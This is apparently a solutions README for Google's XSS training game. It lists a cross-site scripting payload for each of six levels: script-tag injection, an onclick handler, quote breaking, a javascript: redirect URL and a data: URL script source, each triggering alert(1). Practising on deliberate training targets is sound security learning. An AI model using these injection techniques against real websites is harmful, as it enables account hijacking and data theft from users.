# xss-game
https://xss-game.appspot.com/

LEVEL 1
-------
```<script>alert(1)</script>```

LEVEL 2
-------
```<button onclick="javascript:alert(1)">Click me</button>```

LEVEL 3
-------
```https://xss-game.appspot.com/level3/frame#'><script>alert(1)</script>```

LEVEL 4
-------
```');alert('1```

LEVEL 5
-------
```https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)```

LEVEL 6
-------
```https://xss-game.appspot.com/level6/frame#data:text/plain,alert(1)```
